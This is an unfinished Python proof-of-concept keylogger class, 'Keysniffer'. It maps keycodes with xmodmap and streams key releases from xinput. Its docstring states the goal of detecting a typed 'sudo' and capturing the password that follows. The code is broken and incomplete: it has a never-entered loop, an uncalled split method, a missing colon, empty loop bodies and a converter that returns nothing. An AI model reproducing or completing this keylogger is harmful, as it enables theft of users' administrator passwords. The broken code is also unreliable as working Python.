### Trivial Keysniffing PoC
import subprocess
import os
import re

class Keysniffer():
        def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
               self.xinput = xinput_bin
               self.keycodes = {}
               self.outfile = outfile
                
        def GetKeyCodes(self):
                """
                Get keycode mapping using xmodmap and use codes as keys in a dict.
                """
                # Call xmodmap to get keycode mapping, pipe to stdout
                modmap_out = subprocess.Popen(
                        ('xmodmap', '-pm', '-pk'), stdout=subprocess.PIPE,
                        universal_newlines=True)
                
                # Strip whitespaces from each line, then split into lines, and split
                # those lines into lists.
                codes = []
                for line in modmap_out.stdout:
                        codes.append(str(line).strip().split())

                # Iterate through lines. If less than 3 objects in line, skip.
                # If first item of remaining lines is numeric, assign it as key in KEYCODES
                # dict, and assign the 3rd item as the value (3rd item is the name of the key)
                for line in codes:
                        if len(line) < 2:
                                pass
                        else:
                                c1 = str(line[0])
                                if len(line) > 4:
                                        names = [line[2], line[4]]
                                else:
                                        names = [line[2]]
                                if c1.isnumeric():
                                        self.keycodes[str(c1)] = names


        def CodeConverter(self, codes):
                """
                Convert given list of keycodes to their respective values.
                """
                in_buffer = list(codes)
                out_buffer = []
                for item in in_buffer:
                        out_buffer.append(self.keycodes[str(item)])
                

                

        def Sniff(self):
                """
                Execute xinput to begin sniffing keycodes, search for 'sudo' key 
                combination and then capture the input the comes after the next press 
                of 'Enter' up to the next time 'Enter' is pressed.
                """
                keystream = subprocess.Popen((self.xinput), stdout=subprocess.PIPE, 
                        universal_newlines=True)

                code_buf = []
                while len(code_buf) > 5:
                        for line in keystream.stdout:
                                if "release" in line:
                                        code = str(line).strip().split()
                                        code_buf.append(code[2])
                                else:
                                        continue
                
                sudo = str('sudo').split
                search_str = []
                for char in sudo:
                        search_str.append('(' + char + ')')
                search_codes = []

                for item in self.keycodes.keys()
                        reverse_keys = {}


                for item in search_str:
                        
                        

                
                for code in code_buf:


        